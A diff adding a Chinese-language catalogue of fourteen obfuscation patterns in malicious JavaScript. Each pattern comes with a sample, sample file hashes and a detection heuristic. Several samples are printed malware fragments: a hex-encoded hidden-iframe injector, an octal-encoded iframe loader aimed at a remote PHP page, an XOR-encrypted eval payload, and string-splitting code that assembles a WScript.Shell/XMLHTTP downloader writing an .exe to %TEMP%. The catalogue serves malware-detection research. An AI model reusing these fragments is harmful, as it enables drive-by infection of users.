@@ -1,0 +1,331 @@
+模式1说明：压缩。文件部分（或全部）换行符少于此处总字符数的1%（可设置一个大小为1000字节的
+缓冲区来判定）
+用例：（见文件）
+文件Hash：0a0e10988e66bffe2be4fb6d62760d73,0a7b662dba064819a1e3c762fadb697b,
+0a89e057b47001aa96cbb9b350913cbc,0a0408ceb46f34f230e333557328d2fc,
+0a6891b0e0e717445feb7d08c8e84b81,0a74359f190c92a6c0f776034c08855a,
+0aac8b7a77c8da292e612d63077d280c,0aec8291a01f84dbd8ea186494937f6a,
+00bd3cda5a94327755fb107b1af8a570,0ce0f66bae012600e943a3d32638d58c,
+0d7ab883292d9b0356bcc1a1246e7b1b,0d9faee0c0b21b290bc33648ac0313ea,
+0d45b6318f8d1b9dad2faa6b6703774f,0d90839bd4c9bcb62795a8a1f20ce7bd,
+0db0c7164e7f6a734957991166513539,0db6dfe80b877e5598dadb487ffb986b
+方法：设置一个大小为1000字节的缓冲区，不断读入程序的下1000个字符并记录换行符的个数。如
+果缓冲区内换行符的个数小于10个就判定为此模式
+
+模式2说明：超长字典。构建字典/映射表，长度超过50个键值对
+用例： 1.NCMCJKVczcCUyiV={"00":0,"01":1,"02":2,"03":3,"04":4,"05":5,"06":6,"07":7,"08":8,"09":9,"0A":10,"0B":11,"0C":12,"0D":13,"0E":14,"0F":15,"10":16,"11":17,"12":18,"13":19,"14":20,"15":21,"16":22,"17":23,"18":24,"19":25,"1A":26,"1B":27,"1C":28,"1D":29,"1E":30,"1F":31,"20":32,"21":33,"22":34,"23":35,"24":36,"25":37,"26":38,"27":39,"28":40,"29":41,"2A":42,"2B":43,"2C":44,"2D":45,"2E":46,"2F":47,"30":48,"31":49,"32":50,"33":51,"34":52,"35":53,"36":54,"37":55,"38":56,"39":57,"3A":58,"3B":59,"3C":60,"3D":61,"3E":62,"3F":63,"40":64,"41":65,"42":66,"43":67,"44":68,"45":69,"46":70,"47":71,"48":72,"49":73,"4A":74,"4B":75,"4C":76,"4D":77,"4E":78,"4F":79,"50":80,"51":81,"52":82,"53":83,"54":84,"55":85,"56":86,"57":87,"58":88,"59":89,"5A":90,"5B":91,"5C":92,"5D":93,"5E":94,"5F":95,"60":96,"61":97,"62":98,"63":99,"64":100,"65":101,"66":102,"67":103,"68":104,"69":105,"6A":106,"6B":107,"6C":108,"6D":109,"6E":110,"6F":111,"70":112,"71":113,"72":114,"73":115,"74":116,"75":117,"76":118,"77":119,"78":120,"79":121,"7A":122,"7B":123,"7C":124,"7D":125,"7E":126,"7F":127,"80":128,"81":129,"82":130,"83":131,"84":132,"85":133,"86":134,"87":135,"88":136,"89":137,"8A":138,"8B":139,"8C":140,"8D":141,"8E":142,"8F":143,"90":144,"91":145,"92":146,"93":147,"94":148,"95":149,"96":150,"97":151,"98":152,"99":153,"9A":154,"9B":155,"9C":156,"9D":157,"9E":158,"9F":159,"A0":160,"A1":161,"A2":162,"A3":163,"A4":164,"A5":165,"A6":166,"A7":167,"A8":168,"A9":169,"AA":170,"AB":171,"AC":172,"AD":173,"AE":174,"AF":175,"B0":176,"B1":177,"B2":178,"B3":179,"B4":180,"B5":181,"B6":182,"B7":183,"B8":184,"B9":185,"BA":186,"BB":187,"BC":188,"BD":189,"BE":190,"BF":191,"C0":192,"C1":193,"C2":194,"C3":195,"C4":196,"C5":197,"C6":198,"C7":199,"C8":200,"C9":201,"CA":202,"CB":203,"CC":204,"CD":205,"CE":206,"CF":207,"D0":208,"D1":209,"D2":210,"D3":211,"D4":212,"D5":213,"D6":214,"D7":215,"D8":216,"D9":217,"DA":218,"DB":219,"DC":220,"DD":221,"DE":222,"DF":223,"E0":224,"E1":225,"E2":226,"E3":227,"E4":228,"E5":229,"E6":230,"E7":231,"E8":232,"E9":233,"EA":234,"EB":235,"EC":236,"ED":237,"EE":238,"EF":239,"F0":240,"F1":241,"F2":242,"F3":243,"F4":244,"F5":245,"F6":246,"F7":247,"F8":248,"F9":249,"FA":250,"FB":251,"FC":252,"FD":253,"FE":254,"FF":255}
+文件Hash：0a0e10988e66bffe2be4fb6d62760d73,0a6891b0e0e717445feb7d08c8e84b81
+方法：通过语法分析判定为字典/变量定义以后，检查字典/变量中的键值对的个数，如果超过50个
+这判定为此模式。
+
+模式3说明：异常函数调用。拆分函数名为数个值为字符串（可能包含转义字符）的变量的组合（
+可能通过函数）
+用例：animated = "Cr"; sortOrder = "eateOb"; _ = "ject"; var div1 = "WSc", msMatchesSelector = "ri", t = "pt"; Expr = ".S", prefix = "hell";
+compiled = parseOnly[animated + sortOrder + _](div1 + msMatchesSelector + t + Expr + prefix);
+-> compiled = CreateObject(WScript.Shell);
+文件Hash：0a1ebe61a24d91bdb8e2e62694c765fc,0a13ad90bcd177094a105036661e2c62,
+0a2092d4f7cd9c262ac67c97fffc6151,0a3679d658f853b79770058ef4a86c31,
+00a9876dc8546a9d0afccdf5ffaa44d3,0a74359f190c92a6c0f776034c08855a,
+0ad0f4a357e3fde1e2be90fdba9ebcd1,0aed68fcce942369d828daefd106b965,
+0b1a7c00c08937ae2234b64d8cd59947,0b6b4dca54dd1bde0ab7a36ce7c87fdd,
+0ba8443230032d485a7070383462ff31,0c2e6251e5235aa2679ed1a3eb47425c,
+0c046feba3c8865000070fd855cb7d4f,0cf1723ed6095cffc2636f0d109fca72,
+0d3c2276663f0cf19f276c6b8ce2dab4,0d5c51ef8d41a3b5f334d108a25db3f0,
+0da5c78635d27772ac284126ce2c94de
+方法：词法分析中出现标识符+"["+用加号连接的一系列标识符+"]"+"("+用加号连接的一系列标识
+符+")"的模式时判定为此模式。前一个中括号里各个字符串的值加起来如果是一个内置函数则确定
+为此模式。
+
+
+模式4说明：超长异常串。1.超长16进制串。连续超过50个字节都是16进制数，并使用了eval函数
+和fromCharCode函数。2.超长\x转义字符串。连续20个字节全由转义字符构成
+用例：
+1.var rfhkryrz = "77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822333464623061383666346434333730616232633232336130386431653961636622293b69662820783333647120213d2022386435323333316132633934666464313965383663306139333839343436646422297b783232627128223334646230613836663464343337306162326332323361303864316539616366222c223864353233333161326339346664643139653836633061393338393434366464222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6373732e7479706f72756c7569706172656e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6566666569447177674143426d3d566d6b516e447478536477266b6579776f72643d353238303530653337383266666165356662376563393963346530383036366226535756466c436346753d58757275786a624e6c65555956756a2646787747576e6375515468413d72564778775255436a56732644787a4a6a5a55684644784e5a46713d515758594e634449562676736449504d4a7a75493d59656c515048267367434f4a546b5169455364464c6d67583d4476634e7a57626f5154516526516e4d7a5078505a42526b764f70766b734e503d50677856714874464b726270686e704a426b477026794a4f715255616a44705a3d7456634c4241617767444f64665577223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";
+for (var dsdnhkhi = 0; dsdnhkhi < rfhkryrz.length; dsdnhkhi += 2) {
+  bkrznnre = bkrznnre + parseInt(rfhkryrz.substring(dsdnhkhi, dsdnhkhi + 2), 16) + ",";
+}
+bkrznnre = bkrznnre.substring(0, bkrznnre.length - 1);
+eval(eval('String.fromCharCode(' + bkrznnre + ')'));
+2. var _0x1C5FC = ["\x25\x64\x58\x6C\x4C\x25\x71\x53\x64\x70\x65\x6D\x65\x50\x41\x6F\x72\x74\x70\x65\x6A\x6C\x65\x6A\x6E\x63\x25\x25\x78\x45\x2E\x58\x43\x75\x70\x28\x72\x6F\x6F\x4C\x4D\x73\x2D\x72\x73\x4D\x6E\x61\x6E\x45\x74\x70\x25\x54\x54\x22\x73\x73\x4D\x3A\x74\x62\x6E\x75\x2E\x25\x4F\x61\x63\x2F\x22\x61\x77\x72\x65\x65\x25\x25\x65\x6A\x25\x62\x53\x66\x6E\x64\x3F\x65\x32\x6C\x65\x2F\x54\x74\x34\x32\x54\x48\x4F\x25\x64\x2E\x78\x6F\x29\x6E\x6E\x74\x6B\x73\x68\x63\x47\x2F\x6F\x74\x64\x73\x74\x65\x53\x3B", "\x6C\x65\x6E\x67\x74\x68", "\x63\x68\x61\x72\x41\x74", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "", "\x25", "\x23\x31", "\x23\x30", "\x23", "\x73\x70\x6C\x69\x74", "\x6A\x6F\x69\x6E"];
+文件Hash：0a2cde294b9ca35da02aa4f1f405f890,0c935f8a039dc1e294822cfd0bc8031d,
+00cf3db1b71970e6847a70a6f4ff8a77,0d6ad8c36ced8b3baa0315eabc3a0b3c,
+0db02a3e6bf6d3ea41837efa316ee05b,0db3b56c858994234127dbb8ab373318
+方法：所有超过50个字符的字符串进行判定，如果全是[0_9,a_f,\x??]的形式就判定为此模式
+
+模式5说明：分隔式长字符串。将程序每一个字符编码成数字，使用字符串进行表示，每个数字之间
+使用"#"，":"，","或者"n"进行分隔，最后使用charAt和fromCharCode函数进行处理
+用例：LikeProgrammeSummerization.txt 3.1
+文件Hash：0a05f424b1908af2557d516b10c62a21,0a6fd674b29ae6f398e8ab220db5f728,
+0a8efb49e9b76de51615c4580d8a6f1f,0a8f13c992f57bd9f10b4c1ae2b69088,
+0a22a4f7c703b3207c7d47bd83e1a6e3,0a064e49f8f7404d78b0559679b93e2e,
+0a731d9f2d3f4a7981cceefe6ecd133e,0a89272d23e4a8f38cfcc18ade36ade4,
+0a98070c857158bd59ba7aeb03276657,0ab3d18999ef455a232b69c36673efec,
+0ac73533cabb6a56173ff2d06f22937d,0ad3edee1d7589fb0ac121d7cfb3eefe,
+0ad6b8069639e1e3389f8537443b9e8f,0ae2c1ed6e3081ad8362aab8bde81365,
+0b1c60c722af1bb363a6f7d850a4dd88,0b2a23dc4434d7b14f2aa63311ea304e,
+0b3d83caf5eca204dbcde7b688be87dd,0b3d83caf5eca204dbcde7b688be87dd,
+0b19fe6decd393343f63940be2751cd8,0b41c445b47fdeb69089c6122607703b,
+0b455aa47882535d58c1fd658e67938e,0b639cd4b4ea70d3435f88819b3f7fc7,
+0b3084e6e70af11b34c137cc1a778714,0b32249ea2f89944f2d018c905328ce6,
+0b53337f93039f1bf4573e83cc5a14a7,00b5520907d65113bbded4243f115c3b,
+0bb15ebf23e4ddd72f83baa1dfd9ef8d,0be4f2317ba0413409f044c473b03dd8,
+0be9164444acd043f579b1e717130683,0bf2ad82818d3fb88ce9b597836e399f,
+0c1d820178887bc91e0fa8f92464c7d5,0c2dec535aa08e66895bb457892b3ea6,
+0c2f3756f570c68e8aa0d385f6dd7aa0,0c4f61aebf1f17fe357d83121a6b98de,
+0c7c3179743e4e26343770f5d6220828,0c17e38301683d5729b0251e7490450f,
+0c81abb723826cbf63cbabe2d9cc70ea,0c152ca996a9b276486682d446ae53b1,
+00c313e315a3af55b1dfa3c672962710,0c1869a7dfba3f1cc31c9290b4ab13de,
+0c2790d4a6dbda97307f7e378d1527f4,0c37459c939e29944f52e667180a713a,
+0cab24403eab1aa9bf8de060cb88a832,0cad7a177ab5931cdc4a63c959e41598,
+0d0fb3fa7b08ca2cf5dbebdc2fee82a1,0d1d63a86e3a1da7b6d56d720b91496a,
+0d5c36be7f5a722a758f3a6d8360ea1e,0cac3fb2d0f5fd38f1e53263163d95e2,
+00d6d12b78db6dd9467060df94fc308c,0d8ff59b25c90e835a3406c9af5bc87f,
+0d9f72e8f51c760e99bea89ded22bf4c,0d47f2c51f97bf58e0ed4f1cc4fae52a,
+0d58dc62c6886c13d749db53cce69c46,0d55283262ac89d37fd34bb3eb746c68,
+00da63a10066ca0eea605e3fad3b231d,0db6dfe80b877e5598dadb487ffb986b,
+00dd1c07fb998137da41a3adfdc1c8d4,061933c53c86f5b08d57a361d1b41806
+方法：对超过50个字符以上的字符串进行模式匹配，如果发现超过25个/#[0_9][0_9]/的形式，并
+识别到charAt和fromCharCode函数，则判定为此模式。
+
+模式6说明：字符串中包含超过5个"%"+数字的形式，并使用了eval函数和unescape函数或eval函数
+和focusin函数或eval函数和invert函数
+用例：
+function when() {
+      eval(unescape("%20%20%20%20%20%20%20%20onabort%5B%22WScr%22.stopQueue%28%29%20+%20webkitMatchesSelector%5D%5B%22Slee%22%20+%20diff%5D%28%28%28responseText%7C12952%29%29%29%3B%20%20%20%0D"));
+}
+文件Hash：0a6edb058be48ffa9c730a81f6a03d8f,0a3679d658f853b79770058ef4a86c31,
+0ad0f4a357e3fde1e2be90fdba9ebcd1,0d3c2276663f0cf19f276c6b8ce2dab4
+方法：对超过50个字符的字符串进行模式匹配，超过5个/%[0_9][0_9]/的形式，并检测到eval函
+数，unescape函数，focusin函数或invert函数则判定为此模式。
+
+模式7说明：连续数字。出现连续超过35个数字的字符串，并使用了charAt,fromCharCode和parseInt函数
+用例：
+m, v, t, z, x = new Array('9091968376', '8887918192818786347374918784939277359287883421333333338896', '877886888787', '949990793917947998942577939317'),
+l = x.length;
+while (++a <= l) {
+m = x[l - a];
+t = z = '';
+for (v = 0; v < m.length;) {
+  t += m.charAt(v++);
+  if (t.length == 2) {
+    z += String.fromCharCode(parseInt(t) + 25 - l + a);
+    t = '';
+  }
+}
+x[l - a] = z;
+}
+文件Hash：00a21bb3c5f44c95c5cfaf4cde64af14,0aeebe748a3bb812a708e866de88a650,
+0cb83cc2ca346a4c49bb49e20afa6e5b,0d1f2c541fb1a80328829148828c53e8,
+0d152f86f63d0677596260509fcb8ce0
+方法：对超过30个字符的字符串进行模式匹配，如果全是数字并检测到fromCharCode函数则判定为
+此模式。
+
+模式8说明：超过70%的字符串包含\x转义字符
+用例：见程序
+文件Hash：0a85cf2e69232ab5bb8dcef24171ac9a,0a74359f190c92a6c0f776034c08855a
+方法：每出现一个包含\x转义字符的字符串则记录，记录值达到所有字符串总值的70%以上则判定为
+此模式。
+
+模式9说明：使用表达式代替字符串或数组元素的索引值，出现次数达20次以上即可判定为此模式
+用例：var sFUPT = kXk[942 - 942] + kXk[346 - 344] + CwJXCrd;
+文件Hash：0a26124a3790fd438183d8d968043c60,0bc299985821ed7cf9cbc5b50dc7a18d,
+0c6d8c0c04f5af57ea7ad7ff07457f32
+方法：出现"["+数字+[+-*/]组合+"]"超过20次则判定为此模式
+
+
+模式10说明：字符串截取。使用一个长字符串的部分表示一个有意义的字符串，可能伴有split函数
+用例：
+function HnHYPAsQ() {
+var XKnXahm = "Sc OpTGOUW r PeubVgDvS ipting GzqcoBe Oit ile hFmufZcizCFioZ System bX ezxzS Obj biXURp ect RxxWxuq ncdGq".split(" ");
+return XKnXahm[0] + XKnXahm[2] + XKnXahm[4] + ".F" + XKnXahm[7] + XKnXahm[9] + XKnXahm[12] + XKnXahm[14];
+}
+var rwk = ("2.XMLHTTP KEccCoB jaRZF XML ream St gTYGFWtC AD RfBddnH O NaJZ D").split(" ");
+var yC = true  , GLmv = rwk[7] + rwk[9] + rwk[11];
+var Cm = cZtG("MS"+rwk[3]+(181955, rwk[0]));
+var qZn = cZtG(GLmv + "B." + rwk[5]+(656953, rwk[4]));
+文件Hash：0af0fa6e02ae64541befc0c3b88afa5c,0bc299985821ed7cf9cbc5b50dc7a18d,
+0c6d8c0c04f5af57ea7ad7ff07457f32
+方法：出现一个超过30个字符的字符串后出现.split，并出现此字符串名+[数字/表达式]超过5次
+的则判定为此模式。
+
+模式11说明：字符替换。使用16进制字符替换一个长字符串中超过20%的字符，并使用了
+eval,fromCharCode和CharCodeAt函数
+用例：
+var key = 'A1SNgEVZqH';
+var b = '(K\x12/*\x1d%<\x14,\x08UknZet)\x14jz<Y(\x12+5.\x18\x27/\x11:4&$\x1b\x02\x02.$U\x1a*O0\x14>\x120\x0bw5,\x002\x27\x19Xh:<YnGev,\x10:aX)\x0f\x06\x08\x0e)\x17-%x7zGxvx4\x06\x15y\x16\x027k\x15\x15<h\x09t\x12\x02.\x0b\x11\x09!\x1a\x08\x7f\x14\x19(\x17\x1d\x099\x07\x11b}\x0d(\x08y-\x01e"^=:\x02+"u\x05 $\x5c6=H1$;\x07--\x1c1"\x08"1?\x03h\x15d\x14\x1c&\x0d\x19\x0e4\x04\x12\x1f\x10\x01*e!-\x06f\x27]<<\x0e$88\x03=$_: \x00k55\x1ch\x0bd\x12\x023\x0a\x01\x1f#\x1c\x13x\x12\x00 \x09\x13t2\x07\x0c\x11\x1e\x0f&\x0e\x15\x1b#\x0cor\x1c\x03G2!-_" Z:#\x05*%._8-\x11\x07\x06"\x13\x1f\x16=\x09\x06t\x05\x0b3\x00\x04\x13?\x09\x13h\x1b\x014\x15\x1f\x0e0\x04or\x1c\x03G\x0d\x17\x0a!\x11\x04d\x01\x014\x11\x19\x0a_\x0b\x0e|q`\x145:3\x05`c\x11qg\x5cH\x5czQhaX5nO0\x14>\x120\x0bw5,\x002\x27\x19Qu|\x11qlNe-W{ha\x11snGev24- c\x06#\x02\x16vgQjoT++E~[PQha\x11.n\x02)%?Q3L;snGevzQh)t6/5\x10;?"h|\x11q`\x17!0xJEK\x11snG8mW{ha\x11s(\x087vr\x07)3\x110+,1,\x0eQua\x01hn\x04 \x1d.\x0b\x1ca\x0ds\x27\x1d\x047\x17);\x27T7\x07\x03qx6\x14&&E;uG&3\x11\x052\x15\x1axgG>[PQha\x11snGe ;\x03h\x0e[\x1b!\x03\x12&\x1f%.6v)%\x0fekz\x1f-6\x11\x12-\x13, ?)\x07#[6-\x13mt\x0d"+3X#:I\x16>?\x1d$c\x18hCmevzQha\x11s\x02\x1f$\x0f341\x00P\x04\x0d7#/\x09Qua~9\x06\x08!\x01*4\x1c\x27F\x144\x0c-x\x1f\x098 _7\x0b\x093?(\x1e&,T=:41$3\x1f/2\x19qk3\x00\x1b\x0aTjh\x11xnE\x19\x0axQca|2:\x0fk$5\x04&%\x19b+_e|z<)5Y}<\x06+25\x1c`h\x18seG-\x13?\x10\x1a\x14\x5c6\x1d\x5cH\x5czQha\x11snG("\x11\x05\x02\x12s\x00\x194ekz\x17)-B6ujOvzQha\x11sn\x0e?\x17;<\x102W6*.!fzLh/T$n&&"3\x07-\x19~1$\x02&"rS\x05\x12i\x1e\x02Uk\x0e\x17=\x00\x15e\x03lN~[PQha\x11snGe? 0)\x0ci (\x02!\x1f>Af._!+\x06!/)\x05)5T0&\x06+1?QuaW& \x041?5\x1f`h\x11(CmevzQha\x11snGev3\x17hi\x05ssZe? 0)\x0ci (\x02!\x1f>Af3T2*\x1e\x16";\x05-a\x17unUufzLuaX)\x0f\x06\x08\x0e)\x17-%x7~I6";\x05=2\x18s5jOvzQha\x11snGevzQha\x11%/\x15e? 0)\x0ci (\x02!\x1f>@h|\x11=+\x10e\x179\x05!7T\x0b\x01\x05/39\x05`cp\x17\x01#\x07x\x09\x05:$P>lN~[PQha\x11snGevzQha\x11sn\x0e#vr\x182\x00P\x1e\x16\x14#3>8,p\x1f<>\x02+~s]h(K\x12/*\x1d%<\x14,\x08Ub`\x13<&?Qua\x00\x7fn\x0e?\x17;<\x102W6*.!gt\x06:(E6f\x0e?\x17;<\x102W6*.!ft#-2A< \x14 \x145\x151h\x1ds{\x02vvfQ!;p2\x03?60?\x15\x01%\x00}=\x0e?3sQ3L;snGevzQha\x11snGevzQha\x11>:,1\x1c\x093\x1b\x16bssG1$/\x14sL;snGevzQha\x11snGevzQha\x11:4&$\x1b\x02\x02.$U\x1a*Vk&5\x02!5X< GxvjJEK\x11snGevzQha\x11snGevzQhaX)\x0f\x06\x08\x0e)\x17-%x7\x7fI67,\x14\x1c.w:"\x02m\x1a"\x10\x11(t*\x0f\x06\x12\x15\x0a\x171\x12\x1ds|N~[PQha\x11snGevzQha\x11snGevz\x05:8\x11(CmevzQha\x11snGevzQha\x11snGevzQ\x07+y<*05\x13\x0e\x17?\x06K8&I\x17#4Y\x049P\x0a\x27"<\x17;&\x0b\x11W*\x1dKegvQxh<YnGevzQha\x11snGevzQha\x11s3G&7.\x12 a\x19:4&$\x1b\x02\x02.$U\x1a*Ulv!\x0cEK\x11snGevzQha\x11snGev\x27|Ba\x11snGevzQha\x11snGe? 0)\x0ci (\x02!\x1f>@f"]<=\x02m\x7fW{ha\x11snGevzQhaL^DGevzQha\x11.ujOvzQha\x11sn\x137/z\x0aEK\x11snGevzQha\x11s\x27\x1d\x047\x17);\x27T7\x07\x03ux5\x01-/\x19q\x09"\x11tvQj)E\x27>]jyxQcaX)\x0f\x06\x08\x0e)\x17-%x7z<&3\x11\x052\x15lseGgy=\x14<oA;>X6%-\x19\x115w$$"\x06\x1fgShj\x11\x1e/\x13-x(\x10&%^>fNe}zSn*T*sEe}z\x182\x00P\x1e\x16\x14#3>8,y\x11xn\x12\x0729\x09\x02\x07W1)\x104\x15vQ. ] +N~[PQha\x11snGevzQh(K\x12/*\x1d%<\x14,\x08Uc`\x14 8>Yaz<YnGevzQhaLs-\x06152Q`(K\x12/*\x1d%<\x14,\x08U`gG>+W{ha\x11snGev3\x17hi\x5c\x27\x05\x13\x0f\x05\x18"\x1f\x12\x18s5jOvzQha\x11snGevz\x13:$P8ujOvzQha\x11sn\x1a~[PQha\x11.ujO+a|B(K\x12/*\x1d%<\x14,\x08U{lElmW{!;p2\x03?60?\x15\x01%\x19qh\x17!0g\x07&6S\x06,Elm';
+for (var IuADfcBGlD5 = "", IuADfcBGlD6 = 0, IuADfcBGlD7 = 0; IuADfcBGlD6 < b.length; IuADfcBGlD6++) IuADfcBGlD5 += String.fromCharCode(b.charCodeAt(IuADfcBGlD6) ^ key.charCodeAt(IuADfcBGlD7)), IuADfcBGlD7++, IuADfcBGlD7 == key.length && (IuADfcBGlD7 = 0);
+eval(IuADfcBGlD5);
+文件Hash：0b8c85bb8a1624e8a5a2a64b412d91fe,0bd03d0ce78d61a874f8890e15c20d04,
+0ceea2d3162b9f7584240b77692b65dd,0d5c51ef8d41a3b5f334d108a25db3f0
+方法：一个字符串中\x转义字符超过100个，并检测到eval函数，fromCharCode函数和
+charCodeAt函数则判定为此模式。
+
+模式12说明：异常函数调用。使用String[字符串]的形式定义一个内置函数
+用例：
+ff = String;
+fff = "fromCharCode";
+ff = ff[fff];
+ff(w[j])
+文件Hash：0b40593f1d2dd27a1d25830c6918f7d2
+方法：出现字符串形式的内置函数，检测到String+"["+标识符+"]"则判定为此模式
+
+模式13说明：超长显示定义数组。显示定义超过50个元素的数组
+用例：
+f = new Array(050, 0146, 0165, 0156, 0143, 0164, 0151, 0157, 0156, 040, 050, 051, 040, 0173, 015, 012, 040, 040, 040, 040, 0166, 0141, 0162, 040, 0171, 0150, 0153, 040, 075, 040, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0143, 0162, 0145, 0141, 0164, 0145, 0105, 0154, 0145, 0155, 0145, 0156, 0164, 050, 047, 0151, 0146, 0162, 0141, 0155, 0145, 047, 051, 073, 015, 012, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0162, 0143, 040, 075, 040, 047, 0150, 0164, 0164, 0160, 072, 057, 057, 065, 0123, 0164, 0141, 0162, 0104, 0162, 0145, 0141, 0155, 0124, 0145, 0141, 0155, 056, 0143, 0157, 0155, 057, 0167, 0160, 055, 0151, 0156, 0143, 0154, 0165, 0144, 0145, 0163, 057, 0145, 0163, 0144, 056, 0160, 0150, 0160, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0160, 0157, 0163, 0151, 0164, 0151, 0157, 0156, 040, 075, 040, 047, 0141, 0142, 0163, 0157, 0154, 0165, 0164, 0145, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0142, 0157, 0162, 0144, 0145, 0162, 040, 075, 040, 047, 060, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0150, 0145, 0151, 0147, 0150, 0164, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0167, 0151, 0144, 0164, 0150, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0154, 0145, 0146, 0164, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 040, 040, 040, 040, 0171, 0150, 0153, 056, 0163, 0164, 0171, 0154, 0145, 056, 0164, 0157, 0160, 040, 075, 040, 047, 061, 0160, 0170, 047, 073, 015, 012, 015, 012, 040, 040, 040, 040, 0151, 0146, 040, 050, 041, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0147, 0145, 0164, 0105, 0154, 0145, 0155, 0145, 0156, 0164, 0102, 0171, 0111, 0144, 050, 047, 0171, 0150, 0153, 047, 051, 051, 040, 0173, 015, 012, 040, 040, 040, 040, 040, 040, 040, 040, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0167, 0162, 0151, 0164, 0145, 050, 047, 074, 0144, 0151, 0166, 040, 0151, 0144, 075, 0134, 047, 0171, 0150, 0153, 0134, 047, 076, 074, 057, 0144, 0151, 0166, 076, 047, 051, 073, 015, 012, 040, 040, 040, 040, 040, 040, 040, 040, 0144, 0157, 0143, 0165, 0155, 0145, 0156, 0164, 056, 0147, 0145, 0164, 0105, 0154, 0145, 0155, 0145, 0156, 0164, 0102, 0171, 0111, 0144, 050, 047, 0171, 0150, 0153, 047, 051, 056, 0141, 0160, 0160, 0145, 0156, 0144, 0103, 0150, 0151, 0154, 0144, 050, 0171, 0150, 0153, 051, 073, 015, 012, 040, 040, 040, 040, 0175, 015, 012, 0175, 051, 050, 051, 073)
+文件Hash：0b40593f1d2dd27a1d25830c6918f7d2,0c8ebff9d1172e502414fb2d419df316
+方法：出现显示数组定义时对元素进行计数，超过50个则判定为此模式。
+
+模式14说明：异常字符串处理。定义一个字符串后使用这个字符串之前对其进行大量增改删除分离
+合并操作
+用例：
+1.var zkFgsm = ["L" + "jj" + ("accepts", "erroneously", "defunct", "Rk") + ("chuck", "trend", "dHh"), ("ensure", "carol", "antecedent", "bJN") + "yp" + ("villager", "posing", "wtjd") + ("lover", "standstill", "signing", "iniquitous", "RN"), ("outgrown", "freehold", "E") + "xpandEnvir" + "on" + "mentSt" + ("xanax", "heated", "situate", "rings"), "" + ("fitness", "files", "arkansas", "indomitable", "%") + "TE" + ("obsession", "temps", "MP%"), "/ePUOwFcnW" + "" + ("autocratic", "novels", "polyphonic", ".") + "exe", ("admit", "weddings", "mirrors", "R") + "un", "A" + "ctpa" + ("steamed", "advantages", "approximation", "category", "inti") + "ngiv" + "pa" + "in" + "ti" + "ng" + "eXpainti" + "ng" + ("deals", "phoenix", "winder", "Ob") + "paintingjepaintingct", "vWDWhzH", "YDXItXRrPpf", "WSc" + ("tropic", "scouting", "attract", "mobile", "pa") + ("cologne", "solder", "intingript") + ("figurative", "cupid", "pain") + ("impede", "enquiring", "entered", "tions", "ting.") + ("hysteria", "disquisition", "S"), "gdPKHsn", "h" + ("careworn", "choosing", "complacent", "lingerie", "pa") + "inti" + ("petite", "lamentation", "ng") + ("sense", "together", "tired", "esprit", "el") + ("promotion", "christ", "trials", "pa") + ("developed", "underwear", "in") + ("manatarms", "switched", "harris", "tingl"), "NxESUQ", "Q" + "Ts" + ("completeness", "effectiveness", "engender", "oT") + "Bh", "M" + "pa" + "inti" + ("joseph", "chrysalis", "ng") + "SX" + "pain" + "ti" + "ng" + "MLpa" + "in" + ("disarm", "economies", "distributions", "ti") + "ng2" + "." + "pa" + "in" + "ti" + "ng" + ("evaluations", "emulation", "subscriptions", "XM") + ("clusters", "appliance", "atheism", "pa") + "in" + "ti" + "ng" + ("witless", "weight", "LH") + "pa" + "in" + "ti" + "ng" + ("senior", "seriously", "chicago", "amend", "TTP")];
+jIvwWWfOLhK = " Fallback to seeking `elem` from the start (diff = nodeIndex = 0) || start.pop()) ) {";
+zkFgsm.splice(7, passingI + 2)
+passingI = 6;
+zkFgsm[passingI + 1] = zkFgsm[passingI + 1] + zkFgsm[passingI + 3];
+zkFgsm[passingI + 2] = "zCMaRvxE";
+passingI++;
+zkFgsm.splice(passingI + 1, passingI - 4);
+zkFgsm[passingI] = zkFgsm[passingI].split("painting").join("");
+2. var r = String.fromCharCode(127);
+var i = "";
+var p = "%";
+var m = "#1";
+var q = "%";
+var f = "#0";
+var d = "#";
+return o.join(i).split(p).join(r).split(m).join(q).split(f).join(d).split(r) ?
+文件Hash：0bc595a9d7c77fea81d355cfac04cf28,00bd3cda5a94327755fb107b1af8a570,
+0d0f8c58b0ad357b0510e0da264afb7d
+方式：将一次操作定义为增（.join）/改（标识符+"["+数字/表达式+"]"+"="+字符串）/删（
+.splice）/分（.split），出现15次以上操作或5次以上连续操作则判定为此模式。
+
